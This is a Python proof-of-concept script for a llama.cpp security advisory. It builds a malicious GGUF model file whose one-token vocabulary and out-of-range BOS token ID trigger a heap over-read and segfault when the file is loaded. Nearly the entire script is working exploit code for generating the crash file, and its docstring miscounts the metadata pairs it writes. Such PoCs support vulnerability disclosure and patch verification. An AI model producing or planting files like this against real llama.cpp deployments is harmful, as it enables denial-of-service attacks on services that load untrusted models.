#!/usr/bin/env python3
"""
GHSA-g4cc-763q-h9h6 PoC - Create GGUF with tiny vocab triggering heap over-read
Triggers out-of-bounds read in llama_vocab::impl::load (llama-vocab.cpp)
Reference: https://github.com/ggml-org/llama.cpp/security/advisories/GHSA-g4cc-763q-h9h6

Vulnerability mechanism:
  In llama-vocab.cpp (llama.cpp before commit c33fe8b8), the vocab loading code
  reads special token IDs from GGUF metadata (e.g., tokenizer.ggml.bos_token_id).
  The default BOS token ID is 1. After building the id_to_token vector from the
  tokenizer.ggml.tokens array, the code accesses id_to_token[bos_token_id] without
  first checking that bos_token_id < id_to_token.size().

  If a malicious GGUF file declares a vocabulary with only 1 token (index 0) but
  sets bos_token_id = 1, the access to id_to_token[1] is an out-of-bounds read
  on the heap. This causes a segmentation fault (SIGSEGV), resulting in a Denial
  of Service.

  This script creates a GGUF file with:
  - Valid GGUF header (magic, version 3, 1 tensor, 7 metadata KV pairs)
  - general.architecture = "llama"
  - tokenizer.ggml.model = "llama"
  - tokenizer.ggml.tokens = ["<pad>"]  (array of 1 string - the tiny vocab)
  - tokenizer.ggml.scores = [0.0]      (array of 1 float32)
  - tokenizer.ggml.token_type = [0]    (array of 1 int32)
  - tokenizer.ggml.bos_token_id = 1    (THE TRIGGER: BOS id >= vocab size)
  - 1 dummy tensor so the file looks like a valid model
"""
import struct
import sys

GGUF_MAGIC = b"GGUF"
GGUF_VERSION = 3

# GGUF value types
GGUF_TYPE_UINT32 = 4
GGUF_TYPE_INT32 = 5
GGUF_TYPE_FLOAT32 = 6
GGUF_TYPE_STRING = 8
GGUF_TYPE_ARRAY = 9


def write_string(f, s: str):
    """Write a GGUF string (uint64 length + bytes, no null terminator)."""
    encoded = s.encode("utf-8")
    f.write(struct.pack("<Q", len(encoded)))
    f.write(encoded)


def write_kv_string(f, key: str, value: str):
    """Write a metadata key-value pair where the value is a string."""
    write_string(f, key)
    f.write(struct.pack("<I", GGUF_TYPE_STRING))
    write_string(f, value)


def write_kv_uint32(f, key: str, value: int):
    """Write a metadata key-value pair where the value is a uint32."""
    write_string(f, key)
    f.write(struct.pack("<I", GGUF_TYPE_UINT32))
    f.write(struct.pack("<I", value))


def write_kv_array_string(f, key: str, values: list):
    """Write a metadata key-value pair where the value is an array of strings."""
    write_string(f, key)
    f.write(struct.pack("<I", GGUF_TYPE_ARRAY))
    f.write(struct.pack("<I", GGUF_TYPE_STRING))
    f.write(struct.pack("<Q", len(values)))
    for v in values:
        write_string(f, v)


def write_kv_array_float32(f, key: str, values: list):
    """Write a metadata key-value pair where the value is an array of float32."""
    write_string(f, key)
    f.write(struct.pack("<I", GGUF_TYPE_ARRAY))
    f.write(struct.pack("<I", GGUF_TYPE_FLOAT32))
    f.write(struct.pack("<Q", len(values)))
    for v in values:
        f.write(struct.pack("<f", v))


def write_kv_array_int32(f, key: str, values: list):
    """Write a metadata key-value pair where the value is an array of int32."""
    write_string(f, key)
    f.write(struct.pack("<I", GGUF_TYPE_ARRAY))
    f.write(struct.pack("<I", GGUF_TYPE_INT32))
    f.write(struct.pack("<Q", len(values)))
    for v in values:
        f.write(struct.pack("<i", v))


# GGUF tensor types
GGML_TYPE_F32 = 0


def write_kv_float32(f, key: str, value: float):
    """Write a metadata key-value pair where the value is a float32."""
    write_string(f, key)
    f.write(struct.pack("<I", GGUF_TYPE_FLOAT32))
    f.write(struct.pack("<f", value))


def create_malicious_gguf(output_path: str):
    n_vocab = 1
    embedding_length = 64

    with open(output_path, "wb") as f:
        # --- GGUF Header ---
        f.write(GGUF_MAGIC)
        f.write(struct.pack("<I", GGUF_VERSION))

        n_tensors = 1   # 1 tensor: token_embd.weight
        n_kv = 14       # metadata key-value pairs

        f.write(struct.pack("<Q", n_tensors))
        f.write(struct.pack("<Q", n_kv))

        # --- Metadata Key-Value Pairs ---

        # 1. general.architecture = "llama"
        write_kv_string(f, "general.architecture", "llama")

        # 2. tokenizer.ggml.model = "llama"
        write_kv_string(f, "tokenizer.ggml.model", "llama")

        # 3. tokenizer.ggml.tokens = ["<pad>"]  -- ONLY 1 TOKEN (vocab size = 1)
        write_kv_array_string(f, "tokenizer.ggml.tokens", ["<pad>"])

        # 4. tokenizer.ggml.scores = [0.0]
        write_kv_array_float32(f, "tokenizer.ggml.scores", [0.0])

        # 5. tokenizer.ggml.token_type = [0]  (normal token)
        write_kv_array_int32(f, "tokenizer.ggml.token_type", [0])

        # 6. tokenizer.ggml.bos_token_id = 1
        #    THIS IS THE TRIGGER: BOS token id (1) >= vocab size (1)
        #    The code will try to access id_to_token[1] which is out of bounds
        write_kv_uint32(f, "tokenizer.ggml.bos_token_id", 1)

        # 7-13. llama architecture metadata (required for model loading to reach vocab)
        write_kv_uint32(f, "llama.block_count", 1)
        write_kv_uint32(f, "llama.context_length", 512)
        write_kv_uint32(f, "llama.embedding_length", embedding_length)
        write_kv_uint32(f, "llama.attention.head_count", 1)
        write_kv_uint32(f, "llama.attention.head_count_kv", 1)
        write_kv_uint32(f, "llama.feed_forward_length", 128)
        write_kv_float32(f, "llama.rope.freq_base", 10000.0)
        write_kv_float32(f, "llama.attention.layer_norm_rms_epsilon", 1e-5)

        # --- Tensor Info ---
        # token_embd.weight of shape [embedding_length, n_vocab]
        write_string(f, "token_embd.weight")
        # n_dims (uint32)
        f.write(struct.pack("<I", 2))
        # dimensions (uint64 each)
        f.write(struct.pack("<Q", embedding_length))
        f.write(struct.pack("<Q", n_vocab))
        # type (uint32) - F32
        f.write(struct.pack("<I", GGML_TYPE_F32))
        # offset (uint64) - offset from start of tensor data
        f.write(struct.pack("<Q", 0))

        # --- Tensor Data ---
        # Align to 32 bytes (GGUF requires tensor data to be aligned)
        current_pos = f.tell()
        alignment = 32
        padding_needed = (alignment - (current_pos % alignment)) % alignment
        f.write(b"\x00" * padding_needed)

        # Write tensor data: embedding_length * n_vocab float32 values
        n_elements = embedding_length * n_vocab
        for i in range(n_elements):
            f.write(struct.pack("<f", 0.01 * (i % 100)))

    print(f"Created malicious GGUF: {output_path}")
    print(f"  Vulnerability: Heap over-read in llama_vocab::impl::load")
    print(f"  Vocab size: 1 token (['<pad>'] at index 0)")
    print(f"  BOS token ID: 1 (out of bounds - triggers access to id_to_token[1])")
    print(f"  Expected result: Segmentation fault (SIGSEGV) when loading model")


if __name__ == "__main__":
    output = sys.argv[1] if len(sys.argv) > 1 else "malicious.gguf"
    create_malicious_gguf(output)
